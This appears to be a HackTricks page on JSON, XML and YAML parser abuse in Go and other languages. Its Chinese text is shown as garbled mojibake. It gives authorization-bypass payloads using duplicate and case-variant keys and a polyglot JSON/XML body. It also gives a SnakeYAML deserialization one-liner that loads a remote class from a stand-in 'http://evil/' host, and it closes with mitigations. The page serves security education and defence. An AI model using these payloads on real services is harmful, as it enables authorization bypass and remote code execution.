# JSON, XML & Yaml é»‘å®¢ä¸é—®é¢˜

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

ä»¥ä¸‹é—®é¢˜æ˜¯åœ¨ Go çš„ JSON ä¸­å‘ç°çš„ï¼Œå°½ç®¡å®ƒä»¬ä¹Ÿå¯èƒ½å­˜åœ¨äºå…¶ä»–è¯­è¨€ä¸­ã€‚è¿™äº›é—®é¢˜å‘å¸ƒåœ¨ [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)ã€‚

Go çš„ JSONã€XML å’Œ YAML è§£æå™¨åœ¨ä¸ä¸€è‡´æ€§å’Œä¸å®‰å…¨é»˜è®¤é…ç½®æ–¹é¢æœ‰ç€é•¿æœŸçš„é—®é¢˜é“¾ï¼Œè¿™äº›é—®é¢˜å¯è¢«æ»¥ç”¨ä»¥ **ç»•è¿‡èº«ä»½éªŒè¯**ã€**æå‡æƒé™** æˆ– **å¤–æ³„æ•æ„Ÿæ•°æ®**ã€‚

### ï¼ˆåï¼‰åºåˆ—åŒ–æ„å¤–æ•°æ®

ç›®æ ‡æ˜¯åˆ©ç”¨å…è®¸æ”»å‡»è€…è¯»/å†™æ•æ„Ÿå­—æ®µçš„ structï¼ˆä¾‹å¦‚ `IsAdmin`ã€`Password`ï¼‰ã€‚

- ç¤ºä¾‹ç»“æ„ä½“:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- å¸¸è§æ¼æ´

1. **Missing tag** (no tag = å­—æ®µä»ç„¶ä¼šè¢«é»˜è®¤è§£æ):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **é”™è¯¯ä½¿ç”¨ `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
Payload:
```json
{"-": true}
```
âœ”ï¸ é˜»æ­¢å­—æ®µè¢« (un)marshaled çš„æ­£ç¡®æ–¹æ³•ï¼š
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### è§£æå™¨å·®å¼‚

ç›®æ ‡æ˜¯é€šè¿‡åˆ©ç”¨ä¸åŒè§£æå™¨å¯¹ç›¸åŒ payload çš„ä¸åŒè§£é‡Šæ¥ bypass authorizationï¼Œä¾‹å¦‚ï¼š
- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. é‡å¤å­—æ®µ:**
Go çš„ `encoding/json` ä¼šé‡‡ç”¨**æœ€å**çš„å­—æ®µã€‚
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
å…¶ä»–è§£æå™¨ (ä¾‹å¦‚ Javaâ€™s Jackson) å¯èƒ½ä¼šé‡‡ç”¨ **ç¬¬ä¸€ä¸ª**ã€‚

**2. å¤§å°å†™ä¸æ•æ„Ÿï¼š**
Go å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼š
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
ç”šè‡³ Unicode æŠ€å·§ä¹Ÿæœ‰æ•ˆï¼š
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
æƒ³è±¡ï¼š
- Proxy written in Go
- AuthZ service written in Python

æ”»å‡»è€…å‘é€ï¼š
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python çœ‹åˆ° `UserAction`ï¼Œå…è®¸å®ƒ
- Go çœ‹åˆ° `AdminAction`ï¼Œæ‰§è¡Œå®ƒ


### æ•°æ®æ ¼å¼æ··æ·† (Polyglots)

ç›®æ ‡æ˜¯åˆ©ç”¨æ··åˆæ ¼å¼ï¼ˆJSON/XML/YAMLï¼‰çš„ç³»ç»Ÿï¼Œæˆ–åœ¨è§£æå™¨é”™è¯¯æ—¶æ”¾è¡Œçš„æƒ…å†µï¼Œä¾‹å¦‚ï¼š
- **CVE-2020-16250**ï¼šHashiCorp Vault åœ¨ STS è¿”å› JSON è€Œé XML åï¼Œä½¿ç”¨ XML è§£æå™¨è§£æäº† JSONã€‚

æ”»å‡»è€…æ§åˆ¶ï¼š
- è¯·æ±‚å¤´ `Accept: application/json`
- å¯¹ JSON body çš„éƒ¨åˆ†æ§åˆ¶

Go çš„ XML è§£æå™¨**ä»ç„¶**è§£æäº†å®ƒå¹¶ä¿¡ä»»äº†æ³¨å…¥çš„èº«ä»½ã€‚

- æ„é€ çš„ payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Result:
- **Go JSON** parser: `Action_2`ï¼ˆä¸åŒºåˆ†å¤§å°å†™ + åè€…ç”Ÿæ•ˆï¼‰
- **YAML** parser: `Action_1`ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰
- **XML** parser: è§£æå­—ç¬¦ä¸²å†…çš„ `"Action_3"`

---

## å€¼å¾—æ³¨æ„çš„è§£æå™¨æ¼æ´ï¼ˆ2023-2025ï¼‰

> ä»¥ä¸‹å¯å…¬å¼€åˆ©ç”¨çš„é—®é¢˜è¡¨æ˜ï¼Œä¸å®‰å…¨çš„è§£ææ˜¯ä¸€ä¸ªè·¨è¯­è¨€çš„é—®é¢˜ â€”â€” ä¸åªæ˜¯ Go çš„é—®é¢˜ã€‚

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* å½±å“ï¼š`org.yaml:snakeyaml` < **2.0**ï¼ˆè¢« Spring-Bootã€Jenkins ç­‰ä½¿ç”¨ï¼‰ã€‚
* æ ¹æœ¬åŸå› ï¼š`new Constructor()` ååºåˆ—åŒ– **arbitrary Java classes**ï¼Œå…è®¸ gadget chains æœ€ç»ˆå¯¼è‡´ remote-code executionã€‚
* One-liner PoCï¼ˆå°†åœ¨æ˜“å—æ”»å‡»çš„ä¸»æœºä¸Šæ‰“å¼€è®¡ç®—å™¨ï¼‰ï¼š
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* ä¿®å¤ / ç¼“è§£ï¼š
1. **Upgrade to â‰¥2.0** (uses `SafeLoader` by default).
2. On older versions, explicitly use `new Yaml(new SafeConstructor())`.

### libyaml åŒé‡é‡Šæ”¾ (CVE-2024-35325)

* Affects: `libyaml` â‰¤0.2.5 (C library leveraged by many language bindings).
* é—®é¢˜ï¼šè°ƒç”¨ `yaml_event_delete()` ä¸¤æ¬¡å¯¼è‡´åŒé‡é‡Šæ”¾ï¼Œæ”»å‡»è€…å¯å°†å…¶ç”¨äºé€ æˆ DoSï¼Œæˆ–åœ¨æŸäº›åœºæ™¯ä¸‹è¿›è¡Œå †åˆ©ç”¨ã€‚
* çŠ¶æ€ï¼šä¸Šæ¸¸ä»¥ â€œAPI misuseâ€ æ‹’ç»ï¼Œä½† Linux å‘è¡Œç‰ˆå‘å¸ƒäº†ä¿®è¡¥çš„ **0.2.6**ï¼Œå¯¹æŒ‡é’ˆè¿›è¡Œç½®ç©ºé‡Šæ”¾ä½œä¸ºé˜²å¾¡ã€‚

### RapidJSON æ•´æ•°ï¼ˆä¸‹æº¢|ä¸Šæº¢ï¼‰(CVE-2024-38517 / CVE-2024-39684)

* Affects: Tencent **RapidJSON** before commit `8269bc2` (<1.1.0-patch-22).
* æ¼æ´ï¼šåœ¨ `GenericReader::ParseNumber()` ä¸­ï¼Œæœªæ£€æŸ¥çš„ç®—æœ¯æ“ä½œå…è®¸æ”»å‡»è€…æ„é€ å·¨å¤§çš„æ•°å­—å­—é¢é‡å¯¼è‡´å›ç»•å¹¶ç ´åå † â€” æœ€ç»ˆå½“ç”Ÿæˆçš„å¯¹è±¡å›¾ç”¨äºæˆæƒå†³ç­–æ—¶å¯å®ç°æƒé™æå‡ã€‚

---

### ğŸ” ç¼“è§£æªæ–½ï¼ˆæ›´æ–°ï¼‰

| é£é™©                                | ä¿®å¤ / å»ºè®®                                               |
|-------------------------------------|------------------------------------------------------------|
| Unknown fields (JSON)               | `decoder.DisallowUnknownFields()`                          |
| Duplicate fields (JSON)             | âŒ æ ‡å‡†åº“ä¸­æ— ä¿®å¤ â€” ä½¿ç”¨ [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) éªŒè¯ |
| Case-insensitive match (Go)         | âŒ æ— ä¿®å¤ â€” éªŒè¯ç»“æ„ä½“æ ‡ç­¾å¹¶é¢„å…ˆè§„èŒƒåŒ–è¾“å…¥                   |
| XML garbage data / XXE              | ä½¿ç”¨å¼ºåŒ–çš„è§£æå™¨ï¼ˆ`encoding/xml` + `DisallowDTD`ï¼‰         |
| YAML unknown keys                   | `yaml.KnownFields(true)`                                   |
| **ä¸å®‰å…¨çš„ YAML ååºåˆ—åŒ–**          | ä½¿ç”¨ SafeConstructor / å‡çº§åˆ° SnakeYAML â‰¥2.0               |
| libyaml â‰¤0.2.5 åŒé‡é‡Šæ”¾             | å‡çº§åˆ° **0.2.6** æˆ– å‘è¡Œç‰ˆå·²ä¿®è¡¥çš„ç‰ˆæœ¬                      |
| RapidJSON <patched commit           | ä½¿ç”¨æœ€æ–° RapidJSON ç¼–è¯‘ï¼ˆâ‰¥July 2024ï¼‰                      |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## References

- Baeldung â€“ â€œResolving CVE-2022-1471 With SnakeYAML 2.0â€
- Ubuntu Security Tracker â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
